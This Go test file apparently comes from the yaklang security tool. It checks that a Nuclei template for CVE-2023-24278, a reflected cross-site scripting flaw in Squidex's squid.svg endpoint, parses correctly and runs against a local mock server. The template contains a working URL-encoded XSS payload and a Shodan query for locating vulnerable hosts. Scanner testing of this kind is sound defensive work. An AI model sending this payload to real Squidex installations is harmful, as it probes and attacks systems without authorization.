package httptpl

import (
	"github.com/davecgh/go-spew/spew"
	"testing"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
)

func TestCreateYakTemplateFromNucleiTemplateRaw(t *testing.T) {
	server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n" +
		"Content-Length: 111\r\n" +
		"Server: nginx\r\n\r\n"))
	var demo = `id: CVE-2023-24278

info:
  name: Squidex <7.4.0 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
    - https://www.openwall.com/lists/oss-security/2023/03/16/1
    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-24278
    cwe-id: CWE-79
  metadata:
    shodan-query: http.favicon.hash:1099097618
    verified: "true"
  tags: cve,cve2023,xss,squidex,cms,unauth

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a3: "{{rand_int(1000,9000)}}{{a1}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}{{a1}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
    headers:
      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
      Test-Payload: "{{name}} {{a6}}"

    payloads:
      name:
        - "admin123"
        - "aaa123"
      a6:
        - "321nimda"
        - 321aaa

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "looking for!"
          - "{{md5(a4)}}"
        condition: or

      - type: word
        part: header
        words:
          - "image/svg+xml"

      - type: status
        status:
          - 200

# Enhanced by md on 2023/04/14`
	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	if err != nil {
		panic(err)
	}

	if data.Id != "" {
		t.Logf("id: %v", data.Id)
	}

	if len(data.HTTPRequestSequences) == 0 {
		panic("no request sequence")
	}

	if data.HTTPRequestSequences[0].Matcher == nil {
		panic("no matcher")
	}

	if data.Variables == nil {
		panic("variable failed!")
	}

	if ret := data.Variables.ToMap(); len(ret) != 4 {
		spew.Dump(ret)
		panic("variable failed!111")
	} else {
		spew.Dump(ret)
	}

	n, err := data.Exec(nil, false, []byte("GET /bai/path HTTP/1.1\r\n"+
		"Host: www.baidu.com\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	if err != nil {
		panic(err)
	}
	if n != 16 {
		panic(1)
	}
	log.Infof("found N: %v", n)
}

func TestCreateYakTemplateFromNucleiTemplateRaw_AttachSYNC(t *testing.T) {
	var demo = `id: CVE-2023-24278

info:
  name: Squidex <7.4.0 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
    - https://www.openwall.com/lists/oss-security/2023/03/16/1
    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-24278
    cwe-id: CWE-79
  metadata:
    shodan-query: http.favicon.hash:1099097618
    verified: "true"
  tags: cve,cve2023,xss,squidex,cms,unauth

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a3: "{{rand_int(1000,9000)}}{{a1}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}{{a1}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
    headers:
      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
      Test-Payload: "{{name}} {{a6}}"

    attack: pitchfork
    payloads:
      name:
        - "admin123"
        - "aaa123"
      a6:
        - "321nimda"
        - 321aaa

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "looking for!"
          - "{{md5(a4)}}"
        condition: or

      - type: word
        part: header
        words:
          - "image/svg+xml"

      - type: status
        status:
          - 200

# Enhanced by md on 2023/04/14`
	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	if err != nil {
		panic(err)
	}

	if data.Id != "" {
		t.Logf("id: %v", data.Id)
	}

	if len(data.HTTPRequestSequences) == 0 {
		panic("no request sequence")
	}

	if data.HTTPRequestSequences[0].Matcher == nil {
		panic("no matcher")
	}

	if data.Variables == nil {
		panic("variable failed!")
	}

	if ret := data.Variables.ToMap(); len(ret) != 4 {
		spew.Dump(ret)
		panic("variable failed!111")
	} else {
		spew.Dump(ret)
	}

	server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n" +
		"Content-Length: 111\r\n" +
		"Server: nginx\r\n\r\n"))

	n, err := data.Exec(nil, false, []byte("GET /bai/path HTTP/1.1\r\n"+
		"Host: www.baidu.com\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	if err != nil {
		panic(err)
	}
	if n != 8 {
		panic(1)
	}
	log.Infof("found N: %v", n)
}
